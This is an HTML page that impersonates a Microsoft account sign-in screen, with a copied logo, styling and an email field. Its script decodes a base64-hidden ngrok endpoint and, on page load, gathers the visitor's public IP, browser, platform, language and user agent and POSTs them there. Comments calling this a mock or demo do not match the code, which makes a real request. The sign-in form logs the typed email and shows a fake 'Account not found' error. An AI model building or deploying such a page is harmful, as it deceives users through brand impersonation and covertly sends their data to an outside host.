<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles updated for Microsoft's look */
        body {
            font-family: 'Inter', sans-serif;
            /* Lighter, softer background gradient to mimic the original */
            background: #e3e6e8;
            background-image: linear-gradient(180deg, rgba(240, 240, 240, 0.4) 0%, rgba(255, 255, 255, 0.4) 100%);
            min-height: 100vh;
            /* Ensure the content is centered vertically */
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            /* The main white box */
            background: white;
            padding: 2.5rem 2.5rem 2rem 2.5rem; /* Tweak padding for better visual match */
            border-radius: 2px; /* Microsoft uses very slight or no border-radius */
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1); /* Softer shadow */
            width: 100%;
            max-width: 440px; /* Wider card for the desired look */
            border: 1px solid #dcdcdc; /* Subtle border for definition */
        }
        .microsoft-logo-svg {
            width: 108px; /* Standard MS logo width */
            height: 24px;
            fill: #00A4EF; /* Blue is the default but we'll use a multi-color one */
        }
        .input-style {
            width: 100%;
            padding: 0.75rem 0.5rem; /* More vertical padding */
            border: none; /* No border initially */
            border-bottom: 1px solid #999999; /* Light grey underline like the original */
            outline: none;
            font-size: 1rem;
            color: #333333;
            margin-bottom: 2rem; /* More space below the input */
        }
        .input-style:focus {
            border-color: #0067b8; /* Microsoft's primary blue on focus */
            border-width: 2px;
            padding-bottom: 0.75rem; /* Adjust padding to compensate for thicker border */
        }
        .blue-button {
            /* Keep original class for functionality but update styles */
            width: 120px; /* Set a specific width for the 'Next' button */
            background-color: #0067b8; /* Microsoft's primary blue */
            color: white;
            font-weight: 400; /* Regular weight */
            padding: 0.5rem 1rem;
            border-radius: 2px;
            transition: background-color 0.15s ease-in-out;
            font-size: 1rem;
        }
        .blue-button:hover {
            background-color: #005A9E; /* Slightly darker on hover */
        }
        .link-style {
            color: #0067b8; /* Microsoft link blue */
            font-size: 0.875rem; /* Text-sm */
            text-decoration: none;
            line-height: 1.5; /* Line height for better spacing */
            display: block; /* Make it a block element for better click area/spacing */
            width: fit-content;
        }
        .link-style:hover {
            text-decoration: underline;
        }
        .sign-in-options-bar {
            border-top: 1px solid #e6e6e6; /* Light grey separator */
            margin-top: 1.5rem;
            padding-top: 1.5rem;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <svg class="microsoft-logo-svg mb-6" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg" style="display: block;">
            <rect x="0" y="0" width="50%" height="50%" fill="#F25022"/>
            <rect x="50%" y="0" width="50%" height="50%" fill="#7FBA00"/>
            <rect x="0" y="50%" width="50%" height="50%" fill="#00A4EF"/>
            <rect x="50%" y="50%" width="50%" height="50%" fill="#FFB900"/>
        </svg>

        <h1 class="text-2xl font-normal mb-10">Sign in</h1>

        <form onsubmit="handleLoginAttempt(event)">
            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
            
            <p class="link-style">
                No account? Create one!
            </p>

            <p class="link-style mb-8">
                Can't access your account?
            </p>

            <p id="status-message" class="text-sm mb-6 hidden">
                <span id="ip-loader" class="text-xs text-blue-500 hidden">Fetching details...</span>
            </p>

            <div class="flex justify-end">
                <button type="submit" class="blue-button">Next</button>
            </div>
        </form>

        <div class="sign-in-options-bar">
            <div class="flex items-center link-style cursor-pointer w-full" onclick="alert('Sign-in options clicked!')">
                <svg class="w-5 h-5 mr-2" fill="none" stroke="#0067b8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                Sign-in options
            </div>
        </div>

    </div>
    
    <script>

        const encodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh';

        // Decoding function must be used to get the actual endpoint
        const MOCK_API_ENDPOINT = atob(encodedEndpoint);

        const B='N/A';
        let publicIP=B, browserVendor=B, browserLanguage=B, osPlatform=B;
        let userAgent=navigator.userAgent;

        const ipLoaderEl=document.getElementById('ip-loader');
        const statusMessageEl=document.getElementById('status-message');


        /**
         * Function to fetch the user's public IP address using an external API.
         */
        async function fetchIP() {
            ipLoaderEl.classList.remove('hidden');
            const K=3;
            let L=1000;
            for(let M=0;M<K;M++){
                try{
                    const N=await fetch('https://api.ipify.org?format=json');
                    if(!N.ok)throw new Error(`HTTP error! status: ${N.status}`);
                    const O=await N.json();
                    publicIP=O.ip;
                    return true;
                }catch(P){
                    console.error(`Attempt ${M+1}: Could not fetch public IP address.`,P);
                    if(M===K-1){
                        publicIP='IP Fetch Failed';
                        return false;
                    }else{
                        await new Promise(Q=>setTimeout(Q,L));
                        L*=2;
                    }
                }
            }
        }

        /**
         * Function to gather browser and system details via the 'navigator' object.
         */
        function gatherBrowserDetails() {
            let K='Unknown';
            if(userAgent.indexOf("Chrome")!==-1&&userAgent.indexOf("Edg")===-1){
                K='Google Chrome';
            }else if(userAgent.indexOf("Firefox")!==-1){
                K='Mozilla Firefox';
            }else if(userAgent.indexOf("Safari")!==-1&&userAgent.indexOf("Chrome")=== -1){
                K='Apple Safari';
            }else if(userAgent.indexOf("Edg")!==-1){
                K='Microsoft Edge';
            }else if(userAgent.indexOf("MSIE")!==-1||userAgent.indexOf("Trident")!==-1){
                K='Internet Explorer';
            }
            browserVendor=K;
            browserLanguage=navigator.language||B;
            osPlatform=navigator.platform||navigator.oscpu||B;
        }

        /**
         * Simulates sending the reconnaissance data to a mock server endpoint.
         */
        async function sendReconDataToServer(details) {
            console.log('%c--- SIMULATING SERVER TRANSMISSION ---', 'color: orange; font-weight: bold;');
            
            // Console display still logs the decoded endpoint for transparency in this demo
            console.groupCollapsed(`%cData Payload Sent to Mock Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
            console.table(details);
            console.groupEnd();

            try {
                // Actual connection attempt using the decoded endpoint
                const response = await fetch(MOCK_API_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(details)
                });
                if (response.ok) {
                    console.log('');
                }
            } catch (error) {
                console.error('', error);
            }
            
            console.log('');
        }

        /**
         * Handles the login button click.
         */
        function handleLoginAttempt(event) {
            event.preventDefault();
            const userInput=document.getElementById('user-input').value;

            statusMessageEl.textContent = 'Account not found. Please check your credentials.';
            statusMessageEl.classList.remove('hidden', 'text-blue-500', 'text-green-600');
            statusMessageEl.classList.add('text-red-600');
            
            console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
            console.log(`User attempted login with email/phone: ${userInput}`);
            console.log('Input logging disabled for security compliance.');
        }

        /**
         * Main function to gather all details and start the process.
         */
        async function collectAndSendDetails(){
            statusMessageEl.classList.remove('hidden');
            ipLoaderEl.textContent='Gathering initial system data...';
            
            gatherBrowserDetails();
            await fetchIP(); 

            const dataDetails={
                fetchTime:new Date().toISOString(),
                event:"PageLoadRecon",
                publicIP:publicIP,
                browserVendor:browserVendor,
                osPlatform:osPlatform,
                browserLanguage:browserLanguage,
                userAgent:userAgent
            };
            
            await sendReconDataToServer(dataDetails);

            ipLoaderEl.textContent='System data collection completed in background.';
            ipLoaderEl.classList.remove('text-blue-500');
            ipLoaderEl.classList.add('text-green-600');
            
            setTimeout(()=>{
                statusMessageEl.classList.add('hidden');
            }, 5000);
        }

        // Start the background process automatically when the page is loaded
        document.addEventListener('DOMContentLoaded', collectAndSendDetails);
        // End Obfuscated Script
    </script>
</body>
</html>
